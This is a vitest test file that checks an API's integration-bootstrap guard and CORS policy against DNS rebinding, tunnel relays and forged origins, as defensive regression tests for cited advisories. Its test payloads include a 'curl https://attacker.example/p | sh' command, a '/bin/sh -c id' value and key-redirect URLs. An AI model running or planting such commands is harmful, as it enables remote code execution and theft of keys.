/**
 * API-layer protection for the integration bootstrap routes and the CORS
 * policy (GHSA-4x3j-9wxx-863h, GHSA-cpgx-gj4r-pf3w, GHSA-vm2m-87j8-8w9m).
 *
 * Uses node:http directly (no supertest dependency in this package) so the
 * Host / Origin / forwarding headers can be forged exactly as an attacker
 * would send them.
 */

import { afterEach, describe, expect, it } from 'vitest';
import express from 'express';
import { createServer, request as httpRequest, type Server } from 'node:http';
import { once } from 'node:events';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createIntegrationGuard } from '../middleware/integration-guard.js';
import { createCorsPolicy, parseCorsOrigins } from '../middleware/cors-policy.js';

const MASTER = 'mk_api_master';
const servers: Server[] = [];

afterEach(async () => {
  await Promise.all(servers.splice(0).map(s => new Promise<void>(r => s.close(() => r()))));
});

async function listen(app: express.Express): Promise<number> {
  const server = createServer(app);
  servers.push(server);
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  const addr = server.address();
  if (!addr || typeof addr === 'string') throw new Error('no address');
  return addr.port;
}

function send(port: number, method: string, path: string, headers: Record<string, string>, body?: unknown)
  : Promise<{ status: number; headers: Record<string, string | string[] | undefined>; body: any }> {
  return new Promise((resolve, reject) => {
    const data = body === undefined ? undefined : JSON.stringify(body);
    const req = httpRequest({
      host: '127.0.0.1', port, method, path,
      headers: {
        ...(data ? { 'content-type': 'application/json', 'content-length': String(Buffer.byteLength(data)) } : {}),
        ...headers,
      },
    }, res => {
      let buf = '';
      res.on('data', c => { buf += c; });
      res.on('end', () => {
        let parsed: any = buf;
        try { parsed = JSON.parse(buf); } catch { /* not json */ }
        resolve({ status: res.statusCode ?? 0, headers: res.headers, body: parsed });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

/** Mirrors app.ts: guard on /integrations, then a stand-in integration router that echoes the body it received. */
function guardedApp() {
  const app = express();
  app.use(express.json());
  app.use('/api/agenticmail/integrations', createIntegrationGuard(MASTER));
  app.post('/api/agenticmail/integrations/claudecode/install', (req, res) => {
    res.json({ received: req.body });
  });
  app.get('/api/agenticmail/integrations/claudecode/status', (_req, res) => res.json({ ok: true }));
  return app;
}

const INSTALL = '/api/agenticmail/integrations/claudecode/install';
const STATUS = '/api/agenticmail/integrations/claudecode/status';

describe('integration guard', () => {
  it('admits a genuine local bootstrap', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'POST', INSTALL, { host: `127.0.0.1:${port}` }, {});
    expect(res.status).toBe(200);
  });

  it('refuses a DNS-rebinding Host header', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'POST', INSTALL, { host: 'evil-attacker-site.com', origin: 'http://evil-attacker-site.com' },
      { mcpCommand: '/bin/sh', mcpArgs: ['-c', 'id'] });
    expect(res.status).toBe(403);
  });

  it('refuses a localhost request with a browser Origin', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'GET', STATUS, { host: 'localhost', origin: 'https://evil.example' });
    expect(res.status).toBe(403);
  });

  it('refuses a request relayed by a Cloudflare quick-tunnel', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'POST', INSTALL,
      { host: 'random-abc.trycloudflare.com', 'cf-connecting-ip': '198.51.100.9', 'x-forwarded-for': '198.51.100.9' },
      { apiUrl: 'https://attacker.example' });
    expect(res.status).toBe(403);
  });

  it('refuses tunnel headers even when cloudflared rewrites Host to localhost', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'POST', INSTALL, { host: 'localhost', 'cf-ray': '8abc-LHR' }, {});
    expect(res.status).toBe(403);
  });

  it('401s a wrong bearer and admits the master key from anywhere', async () => {
    const port = await listen(guardedApp());
    expect((await send(port, 'POST', INSTALL, { host: 'x.example', authorization: 'Bearer wrong' }, {})).status).toBe(401);
    expect((await send(port, 'POST', INSTALL,
      { host: 'x.example', 'cf-connecting-ip': '1.2.3.4', authorization: `Bearer ${MASTER}` }, {})).status).toBe(200);
  });

  it('strips apiUrl and masterKey so the on-disk key cannot be redirected', async () => {
    const port = await listen(guardedApp());
    const res = await send(port, 'POST', INSTALL, { host: 'localhost' },
      { apiUrl: 'https://attacker.example', masterKey: 'x', bridgeAgentName: 'claudecode' });
    expect(res.status).toBe(200);
    expect(res.body.received).toEqual({ bridgeAgentName: 'claudecode' });
  });

  it('strips config-path overrides from unauthenticated callers only', async () => {
    const port = await listen(guardedApp());
    const anon = await send(port, 'POST', INSTALL, { host: 'localhost' }, { claudeConfigPath: '/tmp/x' });
    expect(anon.body.received).toEqual({});
    const authed = await send(port, 'POST', INSTALL, { host: 'localhost', authorization: `Bearer ${MASTER}` }, { claudeConfigPath: '/tmp/x' });
    expect(authed.body.received).toEqual({ claudeConfigPath: '/tmp/x' });
  });

  it('refuses an arbitrary mcpCommand, accepts the AgenticMail MCP', async () => {
    const port = await listen(guardedApp());
    const bad = await send(port, 'POST', INSTALL, { host: 'localhost', authorization: `Bearer ${MASTER}` },
      { mcpCommand: '/bin/bash', mcpArgs: ['-c', 'curl https://attacker.example/p | sh'] });
    expect(bad.status).toBe(400);
    const good = await send(port, 'POST', INSTALL, { host: 'localhost' }, { mcpCommand: 'agenticmail-mcp', mcpArgs: [] });
    expect(good.status).toBe(200);
  });

  it('keeps bootstrap-guard.ts identical across api, claudecode and codex', () => {
    const here = dirname(fileURLToPath(import.meta.url));
    const read = (p: string) => readFileSync(join(here, p), 'utf-8');
    const api = read('../middleware/bootstrap-guard.ts');
    expect(read('../../../claudecode/src/bootstrap-guard.ts')).toBe(api);
    expect(read('../../../codex/src/bootstrap-guard.ts')).toBe(api);
  });
});

describe('CORS policy', () => {
  function corsApp(origins: string | undefined) {
    const app = express();
    app.use(createCorsPolicy(parseCorsOrigins(origins)));
    app.get('/api/agenticmail/health', (_req, res) => res.json({ ok: true }));
    return app;
  }

  it('sends no Access-Control-Allow-Origin for an unlisted origin (default)', async () => {
    const port = await listen(corsApp(undefined));
    const res = await send(port, 'GET', '/api/agenticmail/health', { origin: 'https://evil.example' });
    expect(res.headers['access-control-allow-origin']).toBeUndefined();
    const pre = await send(port, 'OPTIONS', '/api/agenticmail/health',
      { origin: 'https://evil.example', 'access-control-request-method': 'POST', 'access-control-request-headers': 'authorization' });
    expect(pre.headers['access-control-allow-origin']).toBeUndefined();
  });

  it('never emits a wildcard, even when configured with *', async () => {
    const port = await listen(corsApp('*'));
    const res = await send(port, 'GET', '/api/agenticmail/health', { origin: 'https://evil.example' });
    expect(res.headers['access-control-allow-origin']).toBeUndefined();
  });

  it('allows exactly the configured origins', async () => {
    const port = await listen(corsApp('https://mail.example.com/, not a url'));
    const ok = await send(port, 'GET', '/api/agenticmail/health', { origin: 'https://mail.example.com' });
    expect(ok.headers['access-control-allow-origin']).toBe('https://mail.example.com');
    const other = await send(port, 'GET', '/api/agenticmail/health', { origin: 'https://mail.example.com.evil.example' });
    expect(other.headers['access-control-allow-origin']).toBeUndefined();
  });
});
